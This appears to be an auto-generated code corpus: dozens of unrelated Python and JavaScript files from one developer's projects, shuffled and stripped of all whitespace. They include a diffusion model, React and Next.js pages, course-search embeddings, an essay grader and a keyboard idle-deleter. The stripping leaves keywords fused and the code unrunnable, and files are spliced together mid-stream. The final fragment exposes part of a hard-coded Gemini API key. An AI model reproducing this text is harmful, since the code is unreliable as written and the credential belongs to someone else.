ssert(yisnotNone)==(self.num_classesisnotNone),"mustspecifyyifandonlyifthemodelisclass-conditional->no,relaxthisTODO"hs=[]t_emb=timestep_embedding(timesteps,self.model_channels,repeat_only=False)#21x320emb=self.time_embed(t_emb)#21x1280time=str(timesteps[0].data.cpu().numpy())ifself.num_classesisnotNone:asserty.shape[0]==x.shape[0]emb=emb+self.label_emb(y)#21x1280h=x#21x8x64x64fori,moduleinenumerate(self.input_blocks):h=module(h,emb,context=context,#cam=cam,image_only_indicator=image_only_indicator,cond_view=cond_view,cond_motion=cond_motion,time_context=time_context,num_video_frames=num_video_frames,time_step=time_step,name='encoder_{}_{}'.format(time,i))hs.append(h)h=self.middle_block(h,emb,context=context,#cam=cam,image_only_indicator=image_only_indicator,cond_view=cond_view,cond_motion=cond_motion,time_context=time_context,num_video_frames=num_video_frames,time_step=time_step,name='middle_{}_0'.format(time,i))fori,moduleinenumerate(self.output_blocks):h=th.cat([h,hs.pop()],dim=1)h=module(h,emb,context=context,#cam=cam,image_only_indicator=image_only_indicator,cond_view=cond_view,cond_motion=cond_motion,time_context=time_context,num_video_frames=num_video_frames,time_step=time_step,name='decoder_{}_{}'.format(time,i))h=h.type(x.dtype)returnself.out(h)import{createSelector,createEntityAdapter}from'@reduxjs/toolkit';import{apiSlice}from'../../app/api/apiSlice';constgamesAdapter=createEntityAdapter({});constinitialState=gamesAdapter.getInitialState();exportconstgamesApiSlice=apiSlice.injectEndpoints({endpoints:builder=>({query:()=>'/games',validateStatus:(response,result)=>{returnresponse.status===200&&!result.isError;},keepUnusedDataFor:5,transformResponse:(response)=>{constloadedGames}})});importReact,{Component}from"react";import{Calendar,momentLocalizer}from"react-big-calendar";importmomentfrom"moment";require("react-big-calendar/lib/css/react-big-calendar.css");constlocalizer=momentLocalizer(moment);constmyEventsList=[{title:"LunchMeeting",start:newDate(2023,10,15),//November10th,2023end:newDate(2023,10,15),//November10th,2023allDay:true,},{title:"After-SchoolMeeting",start:newDate(2023,10,29),end:newDate(2023,10,29),allDay:true,},{title:"LunchMeeting",start:newDate(2023,11,6),//November10th,2023end:newDate(2023,11,6),//November10th,2023allDay:true,},{title:"After-SchoolMeeting",start:newDate(2023,11,13),end:newDate(2023,11,13),allDay:true,},];exportdefaultfunctionCalendarComponent(){consteventStyleGetter=(event,start,end,isSelected)=>{letnewStyle={backgroundColor:"#bfdbfe",textAlign:"center",color:"rgb(57,56,56)",borderRadius:"20px",fontSize:"13px",marginTop:"10px",fontWeight:"bold",border:"none",};return{style:newStyle,};};return(<divid="Calendar"><divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><h1className="text-4xlfont-boldmb-4text-blue-500">Calendar</h1><Calendarlocalizer={localizer}events={myEventsList}views={["month"]}timeslots={2}defaultView="month"defaultDate={newDate()}selectable={true}eventPropGetter={eventStyleGetter}/></div></div>);}fromcalculateimport*fromscheduleimportCLASS_COLORSfromtimeimportsleepimportstreamlitasstTIME_ZONE=timedelta(hours=-4)st.set_page_config(page_title='Tiff\'sSchedule',page_icon='🧸',layout='centered',initial_sidebar_state='collapsed',)current_class_header=st.header('')clock=st.header('')st.subheader('CurrentClassProgress')current_class_progress=st.progress(0)st.subheader('SchoolDayProgress')school_day_progress=st.progress(0)defgetColor(period):returnCLASS_COLORS[period]ifperiodisnotNoneelse'rainbow'while(True):#updateclockclock.header((datetime.now()+TIME_ZONE).strftime('%I:%M:%S%p'))period,current_class=get_period_and_class_from_datetime(datetime.now()+TIME_ZONE)#current_class_header.header(current_class,divider=getColor(period))current_class_header.header(current_class)if(periodisnotNone):current_class_progress.progress(get_period_progress_from_datetime(datetime.now()+TIME_ZONE))if(is_school_day()):school_day_progress.progress(get_day_progress_from_datetime(datetime.now()+TIME_ZONE))sleep(1)importImagefrom'next/image';constProductCard=({name,src})=>{return(<divclassName='rounded-xlshadow-smp-5mt-4bg-whiteflexflex-coljustify-betweencursor-pointerhover:shadow-xlduration-200'onClick={()=>{window.location.href=`/products/${name.toLowerCase().replaceAll('','-')}`;}}><ImageclassName='p-8mx-auto'src={src}alt={name}width={300}height={300}priority/><h2className='font-semibold'>{name}</h2></div>);};exportdefaultProductCard;frommanimimport*classExplanation(Scene):defconstruct(self):#Createcirclecircle=Circle(radius=2)self.play(Create(circle))#Createradiuslineradius=Line(ORIGIN,circle.get_center()+2*RIGHT)self.play(Create(radius))#Createcuttinganimationself.play(Transform(radius.copy(),radius.copy().rotate(np.pi/4)))#Createperpendicularcutperpendicular_cut=Line(circle.get_center(),circle.get_center()+2*UP)self.play(Create(perpendicular_cut))#Createrectanglerect=Rectangle(height=circle.get_height(),width=perpendicular_cut.get_length(),color=BLUE)rect.move_to(circle.get_center()+2*RIGHT+UP)self.play(TransformFromCopy(VGroup(radius,perpendicular_cut),rect))#Showtherectanglebecomingmorecompleterects=[rect]for_inrange(4):new_rect=rects[-1].copy().shift(2*RIGHT)self.play(Transform(rects[-1],new_rect))rects.append(new_rect)#Showtherelationshipbetweenrectangleandcircleradius_label=MathTex("r",color=WHITE).next_to(radius,DOWN)circ_label=MathTex("C",color=WHITE).next_to(perpendicular_cut,LEFT)self.play(Create(radius_label),Create(circ_label))area_formula=MathTex("A=\pir^2",color=WHITE).next_to(rect,RIGHT)self.play(Create(area_formula))self.wait(2)#%%importrequestsimportnumpyasnpimportpandasaspdimportrefromgensim.modelsimportWord2Vec,FastTextfromgensim.models.doc2vecimportDoc2Vec,TaggedDocumentfromsklearn.metrics.pairwiseimportcosine_similarityfromtransformersimportBertTokenizer,BertModelimportpickleimporttorchimportfaiss#%%base='https://stanfurdtime.com/api/graphql'query='''queryCoursesQuery{courseList{subjectnumbertitledescription}}'''#%%courses=pd.read_csv('courses.csv')#%%#tojsonformatgroupedbysubjectcourses[['subject','number']].groupby('subject')['number'].apply(list).to_dict()#%%courses=pd.DataFrame(requests.post(base,json={'query':query}).json()['data']['courseList'])#%%courses['combined']=courses['title']+''+courses['description']#%%courses['combined']=courses['combined'].apply(lambdax:re.sub(r'[^a-z0-9\s]','',x.lower())).str.split()#%%#██╗░░░░░░░██╗░█████╗░██████╗░██████╗░██████╗░██╗░░░██╗███████╗░█████╗░#██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗╚════██╗██║░░░██║██╔════╝██╔══██╗#╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║░░███╔═╝╚██╗░██╔╝█████╗░░██║░░╚═╝#░████╔═████║░██║░░██║██╔══██╗██║░░██║██╔══╝░░░╚████╔╝░██╔══╝░░██║░░██╗#░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝███████╗░░╚██╔╝░░███████╗╚█████╔╝#░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░#%%model=Word2Vec(courses['combined'],vector_size=100,window=5,min_count=1,workers=12)#%%courses['embedding']=courses['combined'].apply(lambdax:model.wv[x].mean(axis=0))#%%query='computerscience'#preprocessandvectorizethequeryquery=re.sub(r'[^a-z0-9\s]','',query.lower()).split()query=model.wv[query].mean(axis=0).reshape(1,-1)#comparethequeryvectorwitheachclassvectorcourses['similarity']=cosine_similarity(courses['embedding'].tolist(),query).flatten()#returntop5mostsimilarclassescourses.sort_values('similarity',ascending=False).head(5)#%%#░██████╗░██╗░░░░░░█████╗░██╗░░░██╗███████╗#██╔════╝░██║░░░░░██╔══██╗██║░░░██║██╔════╝#██║░░██╗░██║░░░░░██║░░██║╚██╗░██╔╝█████╗░░#██║░░╚██╗██║░░░░░██║░░██║░╚████╔╝░██╔══╝░░#╚██████╔╝███████╗╚█████╔╝░░╚██╔╝░░███████╗#░╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝#%%embeddings_dictionary={line.split()[0]:np.asarray(line.split()[1:],dtype='float32')forlineinopen('models/glove.6B.100d.txt','r',encoding='utf-8')}#%%defget_glove_embedding(text,embedding_dict,vector_size=100):embeddings=[embedding_dict[word]forwordintextifwordinembedding_dict]if(embeddings):returnnp.mean(embeddings,axis=0)returnnp.zeros(vector_size)#%%courses['embedding']=courses['combined'].apply(lambdax:get_glove_embedding(x,embeddings_dictionary))#%%query='computerscience'query_processed=re.sub(r'[^a-z0-9\s]','',query.lower()).split()query_embedding=get_glove_embedding(query_processed,embeddings_dictionary).reshape(1,-1)#%%courses['similarity']=cosine_similarity(courses['embedding'].tolist(),query_embedding).flatten()#%%top_courses=courses.sort_values('similarity',ascending=False).head(5)top_courses#%%#███████╗░█████╗░░██████╗████████╗████████╗███████╗██╗░░██╗████████╗#██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝╚██╗██╔╝╚══██╔══╝#█████╗░░███████║╚█████╗░░░░██║░░░░░░██║░░░█████╗░░░╚███╔╝░░░░██║░░░#██╔══╝░░██╔══██║░╚═══██╗░░░██║░░░░░░██║░░░██╔══╝░░░██╔██╗░░░░██║░░░#██║░░░░░██║░░██║██████╔╝░░░██║░░░░░░██║░░░███████╗██╔╝╚██╗░░░██║░░░#╚═╝░░░░░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░#%%model=FastText(courses['combined'],vector_size=100,window=5,min_count=1,workers=12)#%%courses['embedding']=courses['combined'].apply(lambdax:model.wv[x].mean(axis=0))#%%query='quantitativefinance'query_processed=re.sub(r'[^a-z0-9\s]','',query.lower()).split()query_embedding=model.wv[query_processed].mean(axis=0).reshape(1,-1)#%%Calculatesimilaritybetweenqueryembeddingandeachcourseembeddingcourses['similarity']=cosine_similarity(courses['embedding'].tolist(),query_embedding).flatten()#%%Returnthetop5mostsimilarcoursestop_courses=courses.sort_values('similarity',ascending=False).head(5)top_courses#%%tagged_data=[TaggedDocument(words=course,tags=[str(i)])fori,courseinenumerate(courses['combined'])]#%%model=Doc2Vec(vector_size=100,window=5,min_count=1,workers=12,epochs=20)model.build_vocab(tagged_data)model.train(tagged_data,total_examples=model.corpus_count,epochs=model.epochs)#%%courses['embedding']=courses['combined'].apply(lambdax:model.infer_vector(x))#%%query='computerscience'query_processed=re.sub(r'[^a-z0-9\s]','',query.lower()).split()query_embedding=model.infer_vector(query_processed).reshape(1,-1)#%%courses['similarity']=cosine_similarity(courses['embedding'].tolist(),query_embedding).flatten()#%%top_courses=courses.sort_values('similarity',ascending=False).head(5)top_courses#%%#██████╗░███████╗██████╗░████████╗#██╔══██╗██╔════╝██╔══██╗╚══██╔══╝#██████╦╝█████╗░░██████╔╝░░░██║░░░#██╔══██╗██╔══╝░░██╔══██╗░░░██║░░░#██████╦╝███████╗██║░░██║░░░██║░░░#╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░#%%device=torch.device('cuda'iftorch.cuda.is_available()else'cpu')tokenizer=BertTokenizer.from_pretrained('bert-base-uncased')model=BertModel.from_pretrained('bert-base-uncased').to(device)#%%defget_bert_embedding(text,tokenizer,model,device):inputs=tokenizer(text,return_tensors='pt',padding=True,truncation=True).to(device)withtorch.no_grad():outputs=model(**inputs)cls_embedding=outputs.last_hidden_state[:,0,:].squeeze().cpu().numpy()returncls_embedding#%%courses['embedding']=courses['combined'].apply(lambdax:get_bert_embedding(''.join(x),tokenizer,model,device))#%%query='computerscience'query_embedding=get_bert_embedding(query,tokenizer,model,device).reshape(1,-1)#%%courses['similarity']=cosine_similarity(courses['embedding'].tolist(),query_embedding).flatten()#%%top_courses=courses.sort_values('similarity',ascending=False).head(5)top_courses#%%#███████╗░█████╗░██╗░██████╗░██████╗#██╔════╝██╔══██╗██║██╔════╝██╔════╝#█████╗░░███████║██║╚█████╗░╚█████╗░#██╔══╝░░██╔══██║██║░╚═══██╗░╚═══██╗#██║░░░░░██║░░██║██║██████╔╝██████╔╝#╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═════╝░#%%embeddings_matrix=np.vstack(courses['embedding'].values)dimension=embeddings_matrix.shape[1]index=faiss.IndexFlatL2(dimension)index.add(embeddings_matrix)#%%query='useless'query_embedding=get_bert_embedding(query,tokenizer,model,device).reshape(1,-1)#%%k=5distances,indices=index.search(query_embedding,k)#%%similar_courses=courses.iloc[indices.flatten()]similar_courses['similarity']=1-distances.flatten()similar_courses#%%#sortcoursesbysimilarityandreturntop5top_courses=similar_courses.sort_values('similarity',ascending=False).head(5)top_courses#%%#ImportLibrariesimportpandasaspdimportnumpyasnpfromstatisticsimportmeanimportmatplotlib.pyplotaspltfromnltk.tokenizeimportRegexpTokenizerfromnltk.corpusimportstopwordsimportpicklefromessaygrader.models.explainabilityimportexplain#Importmodelsregressor_source_ms=pickle.load(open('essaygrader/model_files/regressor_source_ms.sav','rb'))regressor_source_hs=pickle.load(open('essaygrader/model_files/regressor_source_hs.sav','rb'))regressor_pne_ms=pickle.load(open('essaygrader/model_files/regressor_pne_ms.sav','rb'))regressor_pne_hs=pickle.load(open('essaygrader/model_files/regressor_pne_hs.sav','rb'))#Essaygraderclassessaygrader():def__init__(self,grade,topic,row):self.grade=gradeself.topic=topicself.row=rowself.df=pd.read_feather('essaygrader/data/dataset.feather')self.source=self.df.loc[self.df['SourceDependentResponses']==1]self.pne=self.df.loc[self.df['Persuasive/Narrative/Expository']==1]self.source_ms=self.source.loc[self.source['grade']==0]self.source_hs=self.source.loc[self.source['grade']==1]self.pne_ms=self.pne.loc[self.pne['grade']==0]self.pne_hs=self.pne.loc[self.pne['grade']==1]self.explain_source_ms=explain(self.row,self.source_ms)self.explain_pne_ms=explain(self.row,self.pne_ms)self.explain_source_hs=explain(self.row,self.source_hs)self.explain_pne_hs=explain(self.row,self.pne_hs)defgradeEssay(self):self.answer=""ifself.grade=='MS':ifself.topic=='SD':self.answer+="Gradeprediction:"+str(round(regressor_source_ms.predict(self.row)[0],2))+"%."self.answer+=self.explain_source_ms.checkAverageWordLength()+""self.answer+=self.explain_source_ms.checkMisspelled()+""self.answer+=self.explain_source_ms.checkLength()+""self.answer+=self.explain_source_ms.checkKeyWords()+""self.answer+=self.explain_source_ms.checkVocabulary()+""self.answer+=self.explain_source_ms.checkPercentStopWords()+""returnself.answerelse:self.answer+="Gradeprediction:"+str(round(regressor_pne_ms.predict(self.row)[0],2))+"%."self.answer+=self.explain_pne_ms.checkAverageWordLength()+""self.answer+=self.explain_pne_ms.checkMisspelled()+""self.answer+=self.explain_pne_ms.checkLength()+""self.answer+=self.explain_pne_ms.checkKeyWords()+""self.answer+=self.explain_pne_ms.checkVocabulary()+""self.answer+=self.explain_pne_ms.checkPercentStopWords()+""returnself.answerelse:ifself.topic=='SD':self.answer+="Gradeprediction:"+str(round(regressor_source_hs.predict(self.row)[0],2))+"%."self.answer+=self.explain_source_hs.checkAverageWordLength()+""self.answer+=self.explain_source_hs.checkMisspelled()+""self.answer+=self.explain_source_hs.checkLength()+""self.answer+=self.explain_source_hs.checkKeyWords()+""self.answer+=self.explain_source_hs.checkVocabulary()+""self.answer+=self.explain_source_hs.checkPercentStopWords()+""returnself.answerelse:self.answer+="Gradeprediction:"+str(round(regressor_pne_hs.predict(self.row)[0],2))+"%."self.answer+=self.explain_pne_hs.checkAverageWordLength()+""self.answer+=self.explain_pne_hs.checkMisspelled()+""self.answer+=self.explain_pne_hs.checkLength()+""self.answer+=self.explain_pne_hs.checkKeyWords()+""self.answer+=self.explain_pne_hs.checkVocabulary()+""self.answer+=self.explain_pne_hs.checkPercentStopWords()+""returnself.answerimportrequestsimportjsonfromurllib.parseimportquoteclassApi:def__init__(self,base:str,form:str='json',**kwargs):"""generatesaurlfortheapigiventhebaseurlandtheparametersArgs:base(str):baseurlwithouttrailingslashorquestionmarkform(str):formatoftheresponse(jsonortext).Defaultstojson"""self.base=base.rstrip('?').rstrip('/')self.parameters=kwargsassertformin['json','text'],'Invalidform.Mustbejsonortext'self.form=form@propertydefurl(self):url=self.base+'?'forkey,valueinself.parameters.items():if(key!=''):url+=str(key)+'='+str(value)+'&'else:url=url[:len(self.base)+1]+str(value)+'&'+url[len(self.base)+1:]returnurl[:-1]def__repr__(self)->str:returnself.urldef__getitem__(self,key):returnself.parameters[key]def__setitem__(self,key,value):self.parameters[key]=quote(value)defcall(self):response=requests.get(self.url).textifself.form=='json':try:returnjson.loads(response)exceptjson.decoder.JSONDecodeError:print('InvalidJSON,defaultingtotextresponse.')returnresponseelifself.form=='text':returnresponseimportLinkfrom'next/link';constHostWebinarButton=()=>{return(<Linkhref='/host-webinar'><buttonclassName='px-4py-2bg-blue-500text-whiteroundedhover:bg-blue-600'>HostaWebinar</button></Link>);};exportdefaultHostWebinarButton;import{useState,useEffect}from'react';importImagefrom'next/image';import{Sidebar,Menu,MenuItem}from'react-pro-sidebar';import{db}from'@/firebase/firebase';import{doc,onSnapshot}from'firebase/firestore';constQuestionHistory=({userId,category,questions,setQuestion})=>{const[completedQuestions,setCompletedQuestions]=useState([]);const[missedQuestions,setMissedQuestions]=useState([]);const[sidebarCollapsed,setSidebarCollapsed]=useState(false);const[sidebarExpanded,setSidebarExpanded]=useState(false);useEffect(()=>{constdocRef=doc(db,'users',userId);constunsub=onSnapshot(docRef,(doc)=>{if(doc.exists()){constuserData=doc.data();constcompletedQuestions=userData[category]['completedQuestions'];constmissedQuestions=userData[category]['missedQuestions'];setCompletedQuestions(completedQuestions);setMissedQuestions(missedQuestions);}else{console.log('Nosuchdocument!');}});returnunsub;},[category,userId]);useEffect(()=>{consthandleKeyDown=(event)=>{if(event.ctrlKey&&event.key==='/'){setSidebarCollapsed((sidebarCollapsed)=>!sidebarCollapsed);}};window.addEventListener('keydown',handleKeyDown);return()=>{window.removeEventListener('keydown',handleKeyDown);};},[]);return(<SidebarclassName='h-fullbg-blue-50pt-2'collapsed={sidebarCollapsed}width={sidebarExpanded?'50vw':'15vw'}><divclassName='flexjustify-end'>{!sidebarCollapsed&&(<buttonclassName='bg-blue-100hover:bg-blue-200text-blacktext-xlfont-semiboldp-3m-2mb-0rounded-2xlinline-flexitems-centerease-outduration-100border-2border-blue-300'onClick={()=>{setSidebarExpanded(!sidebarExpanded);}}><Imagesrc={sidebarExpanded?'https://www.svgrepo.com/show/533661/chevron-right.svg':'https://www.svgrepo.com/show/533659/chevron-left.svg'}className='fill-currentw-8'width={1}height={1}alt='collapse-sidebar-icon'/></button>)}<buttonclassName='bg-blue-100hover:bg-blue-200text-blacktext-xlfont-semiboldp-2m-2mb-0w-64rounded-2xlinline-flexitems-centerease-outduration-100border-2border-blue-300'onClick={()=>{setSidebarCollapsed(!sidebarCollapsed);}}><Imagesrc={sidebarCollapsed?'https://www.svgrepo.com/show/509895/double-left-chevron.svg':'https://www.svgrepo.com/show/533660/chevron-right-double.svg'}className={'fill-currentw-8'+(!sidebarCollapsed?'mr-2':'')}width={1}height={1}alt='collapse-sidebar-icon'/>{!sidebarCollapsed?'Collapse(Ctrl+/)':''}</button></div><Menu><h5className='text-centerbg-green-100mx-1my-2p-3text-gray-900rounded-2xlfont-semiboldtext-2xlborder-2border-green-300'>QuestionHistory</h5>{[...completedQuestions].reverse().map((questionId)=>{constquestion=Array.from(questions).find((question)=>{returnquestion.id===questionId;});return(<MenuItemkey={questionId}className='border-2roundedm-1border-gray-200flexitems-center'onClick={()=>{setQuestion(question);}}>{missedQuestions.includes(questionId)&&'❌'}&ensp;{question.question}</MenuItem>);})}</Menu></Sidebar>);};exportdefaultQuestionHistory;importsyssys.stdin=open('in')n,p=map(int,input().split())#coord:(cci,cwi)fences=[tuple(map(int,input().split()))for_inrange(p)]#numberthefencesandincrementbasedonthedistancefromthepreviousfence#counterclockwise=[0]#clockwise=[0]*p#foriinrange(1,p):#iffences[i][0]!=fences[i-1][0]:#counterclockwise.append(counterclockwise[-1]+abs(fences[i][0]-fences[i-1][0]))#else:#counterclockwise.append(counterclockwise[-1]+abs(fences[i][1]-fences[i-1][1]))#j=p-i-1#iffences[j][0]!=fences[j+1][0]:#clockwise[j]=clockwise[j+1]+abs(fences[j][0]-fences[j+1][0])#else:#clockwise[j]=clockwise[j+1]+abs(fences[j][1]-fences[j+1][1])#clockwise.insert(0,clockwise.pop())foriinrange(n):a,b,c,d=map(int,input().split())start,end=(a,b),(c,d)start_cc_i,start_cw_i=counterclockwise[fences.index(start)],clockwise[fences.index(start)]end_cc_i,end_cw_i=counterclockwise[fences.index(end)],clockwise[fences.index(end)]distance=min(abs(start_cc_i-end_cc_i),abs(start_cw_i-end_cw_i))print(distance)constexpress=require('express');constrouter=express.Router();constcommentsController=require('../controllers/commentsController');router.get('/',commentsController.getAllComments);router.get('/:id',commentsController.getCommentById);router.get('/game/:id',commentsController.getCommentsByGameId);router.get('/user/:id',commentsController.getCommentsByUserId);router.post('/',commentsController.createNewComment);router.patch('/',commentsController.updateComment);router.delete('/',commentsController.deleteComment);module.exports=router;fromdatetimeimportdatetimeimportkeyboardfromstringimportascii_letters,digitsfrommathimportfloorfromtimeimportsleepimportargparseTIMEOUT=5PERIOD=1DELAY=0.01CHARACTERS=list(ascii_letters+digits)+['backspace','ctrl','space','tab','shift']classStopwatch:def__init__(self,delay:float=DELAY):self.delay=delaydefstart(self):self.start_time=datetime.now()self.end_time=self.start_timeself.running=Truedefrestart(self):self.start()defstop(self):self.end_time=datetime.now()self.running=Falsedefupdate(self):ifself.running:sleep(self.delay)self.end_time=datetime.now()@propertydefelapsed(self)->float:self.update()return(self.end_time-self.start_time).total_seconds()defpressed():returnany([keyboard.is_pressed(key)forkeyinCHARACTERS])defdelete_word():keyboard.press_and_release('ctrl+backspace')defstart_deleting(period:int):stopwatch=Stopwatch()stopwatch.start()i=0while(True):ifpressed():returnif(floor(stopwatch.elapsed)==i):delete_word()i+=perioddefmain():stopwatch=Stopwatch()stopwatch.start()while(True):stopwatch.update()if(pressed()):stopwatch.restart()if(stopwatch.elapsed>TIMEOUT):start_deleting(PERIOD)if__name__=='__main__':parser=argparse.ArgumentParser()parser.add_argument('-t','--timeout',type=int,default=TIMEOUT)parser.add_argument('-p','--period',type=int,default=PERIOD)parser.add_argument('-d','--delay',type=float,default=DELAY)args=parser.parse_args()TIMEOUT=args.timeoutPERIOD=args.periodDELAY=args.delaymain()importImagefrom'next/image';constFeatureCard=({title,description,image})=>{return(<divclassName='flexflex-colitems-centerjustify-centercardroundedbg-gradient-to-brfrom-slate-50to-slate-300shadow-2xlring-1p-5'><Imagesrc={image}alt={title}width={200}height={200}/><h2className='text-xlfont-semiboldm-2'>{title}</h2><pclassName='text-mdtext-gray-600m-2'>{description}</p></div>);};exportdefaultFeatureCard;importContainerfrom'react-bootstrap/Container';importNavfrom'react-bootstrap/Nav';importNavbarfrom'react-bootstrap/Navbar';importNavDropdownfrom'react-bootstrap/NavDropdown';importImagefrom'next/image';constNavigation=()=>{return(<Navbarexpand='lg'className='bg-body-secondary'bg='primary'><Container><Navbar.Brandhref='/'><divclassName='flexflex-shrink-0items-center'><ImageclassName='h-8w-auto'src='/DECA-Diamond-1.png'alt='YourCompany'width={500}height={500}/><spanclassName='text-blue-500font-semiboldrounded-mdpx-3py-2text-base'>DECADashboard</span></div></Navbar.Brand><NavclassName='me-auto'><NavDropdownclassName='mr-2p-1border-blue-400hover:bg-blue-100hover:border-blue-500border-2roundedtransition-colorsease-out'title='Clusters'id='cluster-dropdown'><NavDropdown.Itemhref='/finance'>Finance</NavDropdown.Item><NavDropdown.Itemhref='/hospitality'>HospitalityandTourism</NavDropdown.Item><NavDropdown.Itemhref='/marketing'>Marketing</NavDropdown.Item><NavDropdown.Itemhref='/business-management'>BusinessManagementandAdministration</NavDropdown.Item><NavDropdown.Itemhref='/personal-financial-literacy'>PersonalFinancialLiteracy</NavDropdown.Item><NavDropdown.Itemhref='/entrepreneurship'>Entrepreneurship</NavDropdown.Item></NavDropdown><divclassName='p-1h-14border-green-400hover:bg-green-100hover:border-green-500border-2roundedtransition-colorsease-out'><Nav.Linkid='saved'href='/saved'>BookmarkedQuestions</Nav.Link></div></Nav></Container></Navbar>);};exportdefaultNavigation;importImagefrom"next/image";exportdefaultfunctionHome(){return(<mainclassName="flexmin-h-screenflex-colitems-centerjustify-betweenp-24"><divclassName="z-10max-w-5xlw-fullitems-centerjustify-betweenfont-monotext-smlg:flex"><pclassName="fixedleft-0top-0flexw-fulljustify-centerborder-bborder-gray-300bg-gradient-to-bfrom-zinc-200pb-6pt-8backdrop-blur-2xldark:border-neutral-800dark:bg-zinc-800/30dark:from-inheritlg:staticlg:w-autolg:rounded-xllg:borderlg:bg-gray-200lg:p-4lg:dark:bg-zinc-800/30">Getstartedbyediting&nbsp;<codeclassName="font-monofont-bold">app/page.js</code></p><divclassName="fixedbottom-0left-0flexh-48w-fullitems-endjustify-centerbg-gradient-to-tfrom-whitevia-whitedark:from-blackdark:via-blacklg:staticlg:h-autolg:w-autolg:bg-none"><aclassName="pointer-events-noneflexplace-items-centergap-2p-8lg:pointer-events-autolg:p-0"href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"target="_blank"rel="noopenernoreferrer">By{""}<Imagesrc="/vercel.svg"alt="VercelLogo"className="dark:invert"width={100}height={24}priority/></a></div></div><divclassName="relativeflexplace-items-centerbefore:absolutebefore:h-[300px]before:w-fullsm:before:w-[480px]before:-translate-x-1/2before:rounded-fullbefore:bg-gradient-radialbefore:from-whitebefore:to-transparentbefore:blur-2xlbefore:content-['']after:absoluteafter:-z-20after:h-[180px]after:w-fullsm:after:w-[240px]after:translate-x-1/3after:bg-gradient-conicafter:from-sky-200after:via-blue-200after:blur-2xlafter:content-['']before:dark:bg-gradient-to-brbefore:dark:from-transparentbefore:dark:to-blue-700before:dark:opacity-10after:dark:from-sky-900after:dark:via-[#0141ff]after:dark:opacity-40before:lg:h-[360px]z-[-1]"><ImageclassName="relativedark:drop-shadow-[0_0_0.3rem_#ffffff70]dark:invert"src="/next.svg"alt="Next.jsLogo"width={180}height={37}priority/></div><divclassName="mb-32gridtext-centerlg:max-w-5xllg:w-fulllg:mb-0lg:grid-cols-4lg:text-left"><ahref="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"className="grouprounded-lgborderborder-transparentpx-5py-4transition-colorshover:border-gray-300hover:bg-gray-100hover:dark:border-neutral-700hover:dark:bg-neutral-800/30"target="_blank"rel="noopenernoreferrer"><h2className={`mb-3text-2xlfont-semibold`}>Docs{""}<spanclassName="inline-blocktransition-transformgroup-hover:translate-x-1motion-reduce:transform-none">-&gt;</span></h2><pclassName={`m-0max-w-[30ch]text-smopacity-50`}>Findin-depthinformationaboutNext.jsfeaturesandAPI.</p></a><ahref="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"className="grouprounded-lgborderborder-transparentpx-5py-4transition-colorshover:border-gray-300hover:bg-gray-100hover:dark:border-neutral-700hover:dark:bg-neutral-800hover:dark:bg-opacity-30"target="_blank"rel="noopenernoreferrer"><h2className={`mb-3text-2xlfont-semibold`}>Learn{""}<spanclassName="inline-blocktransition-transformgroup-hover:translate-x-1motion-reduce:transform-none">-&gt;</span></h2><pclassName={`m-0max-w-[30ch]text-smopacity-50`}>LearnaboutNext.jsinaninteractivecoursewith&nbsp;quizzes!</p></a><ahref="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"className="grouprounded-lgborderborder-transparentpx-5py-4transition-colorshover:border-gray-300hover:bg-gray-100hover:dark:border-neutral-700hover:dark:bg-neutral-800/30"target="_blank"rel="noopenernoreferrer"><h2className={`mb-3text-2xlfont-semibold`}>Templates{""}<spanclassName="inline-blocktransition-transformgroup-hover:translate-x-1motion-reduce:transform-none">-&gt;</span></h2><pclassName={`m-0max-w-[30ch]text-smopacity-50`}>ExplorestartertemplatesforNext.js.</p></a><ahref="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"className="grouprounded-lgborderborder-transparentpx-5py-4transition-colorshover:border-gray-300hover:bg-gray-100hover:dark:border-neutral-700hover:dark:bg-neutral-800/30"target="_blank"rel="noopenernoreferrer"><h2className={`mb-3text-2xlfont-semibold`}>Deploy{""}<spanclassName="inline-blocktransition-transformgroup-hover:translate-x-1motion-reduce:transform-none">-&gt;</span></h2><pclassName={`m-0max-w-[30ch]text-smopacity-50text-balance`}>InstantlydeployyourNext.jssitetoashareableURLwithVercel.</p></a></div></main>);}importrandomimportospath=r'C:\Users\natha\Programming'files=[]forroot,_,filenamesinos.walk(path):forfilenameinfilenames:ifnot(filename.endswith('.py')orfilename.endswith('.js')):continueif('node_modules'inroot):continueif('.next'inroot):continueif('CS61A'inroot):continueif('Tutorials'inroot):continueif(filename[0]=='.'):continueif(filename[0]=='_'):continueif(filename.count('.')>=2):continuefiles.append(os.path.join(root,filename))random.shuffle(files)output=''forfileinfiles:withopen(file,'r',encoding='utf-8')asf:output+=f.read()#removeallwhitespaceimportreoutput=re.sub(r'\s+','',output)withopen('corpus/output.txt','w',encoding='utf-8')asf:f.write(output)'useclient';import{useState,useEffect}from'react';import{useRouter}from'next/navigation';import{GoogleGenerativeAI}from'@google/generative-ai';import{Inter}from'next/font/google';constinter=Inter({subsets:['latin']});constclock=1;constNotesPage=()=>{const[topic,setTopic]=useState('');const[viewpoint1,setViewpoint1]=useState('');const[viewpoint2,setViewpoint2]=useState('');const[prepTime,setPrepTime]=useState(0);const[notes,setNotes]=useState('');const[timeLeft,setTimeLeft]=useState(0);const[suggestions,setSuggestions]=useState([]);const[isLoading,setIsLoading]=useState(false);constrouter=useRouter();//InitializeGeminiAPIclientconstgenAI=newGoogleGenerativeAI('AIzaSyC1TqhOqsiYuMLilytOF7cBGgh8NEiP